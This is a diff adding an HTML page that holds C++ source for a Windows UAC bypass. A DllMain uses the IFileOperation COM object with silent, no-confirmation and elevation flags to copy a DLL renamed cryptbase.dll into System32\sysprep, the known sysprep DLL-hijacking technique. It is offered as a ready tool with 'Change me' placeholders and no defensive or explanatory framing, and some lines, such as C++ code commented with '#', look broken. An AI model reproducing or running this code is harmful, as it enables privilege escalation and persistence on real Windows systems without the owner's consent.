@@ -1,0 +1,67 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>iFileOperation COM Object Script</title>
+</head><body>#wusa probably easier<br/>
+#C++<br/>
+#CHANGE VARIABLES (calc.dll/cryptbase.dll/sysprep)<br/>
+<br/>
+#include &lt;stdio.h&gt;<br/>
+#include &lt;Shobjidl.h&gt;<br/>
+#include &lt;Windows.h&gt;<br/>
+<br/>
+#pragma comment(lib, "Ole32.lib")<br/>
+#pragma comment(lib, "shell32.lib")<br/>
+<br/>
+int WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)<br/>
+{<br/>
+&nbsp; &nbsp; FileOperation &nbsp;*pfo;<br/>
+&nbsp; &nbsp; IShellItem &nbsp; &nbsp; &nbsp;*psiFrom = NULL;<br/>
+&nbsp; &nbsp; IShellItem &nbsp; &nbsp; &nbsp;*psiTo = NULL;<br/>
+&nbsp; &nbsp; LPCWSTR pszSrcItem = L"calc.dll"; #Change me<br/>
+&nbsp; &nbsp; LPCWSTR pszNewName = L"cryptbase.dll"; #Change me<br/>
+&nbsp; &nbsp; LPCWSTR pszDest &nbsp; &nbsp;= L"C:\\windows\\System32\\sysprep"; #Change me<br/>
+<br/>
+&nbsp; &nbsp; HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);<br/>
+&nbsp; &nbsp; if (SUCCEEDED(hr))<br/>
+&nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; hr = CoCreateInstance(CLSID_FileOperation, NULL, CLSCTX_ALL, IID_PPV_ARGS(&amp;pfo));<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; if (SUCCEEDED(hr))<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; hr = pfo-&gt;SetOperationFlags( FOF_NOCONFIRMATION |<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FOF_SILENT |<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FOFX_SHOWELEVATIONPROMPT |<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FOFX_NOCOPYHOOKS |<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FOFX_REQUIREELEVATION |<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FOF_NOERRORUI );<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (SUCCEEDED(hr))<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; hr = SHCreateItemFromParsingName(pszSrcItem, NULL, IID_PPV_ARGS(&amp;psiFrom));<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (SUCCEEDED(hr))<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (NULL != pszDest)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; hr = SHCreateItemFromParsingName(pszDest, NULL, IID_PPV_ARGS(&amp;psiTo));<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
+&#09;&#09;&#09;&#09;&#09;&#09;if (SUCCEEDED(hr))<br/>
+&#09;&#09;&#09;&#09;&#09;&#09;{<br/>
+&#09;&#09;&#09;&#09;&#09;&#09;&#09;hr = pfo-&gt;CopyItem(psiFrom, psiTo, pszNewName, NULL);<br/>
+&#09;&#09;&#09;&#09;&#09;&#09;&#09;if (NULL != psiTo)<br/>
+&#09;&#09;&#09;&#09;&#09;&#09;&#09;{<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; psiTo-&gt;Release();<br/>
+&#09;&#09;&#09;&#09;&#09;&#09;&#09;}<br/>
+&#09;&#09;&#09;&#09;&#09;&#09;}<br/>
+&#09;&#09;&#09;&#09;&#09;&#09;psiFrom-&gt;Release();<br/>
+&#09;&#09;&#09;&#09;&#09;}<br/>
+&#09;&#09;&#09;&#09;if (SUCCEEDED(hr))<br/>
+&#09;&#09;&#09;&#09;{<br/>
+&#09;&#09;&#09;&#09;&#09;hr = pfo-&gt;PerformOperations();<br/>
+&#09;&#09;&#09;&#09;}<br/>
+&#09;&#09;&#09;}<br/>
+&#09;&#09;&#09;pfo-&gt;Release();<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; CoUninitialize();<br/>
+&nbsp; &nbsp; }<br/>
+&nbsp; &nbsp; return 0;<br/>
+}</body></html>
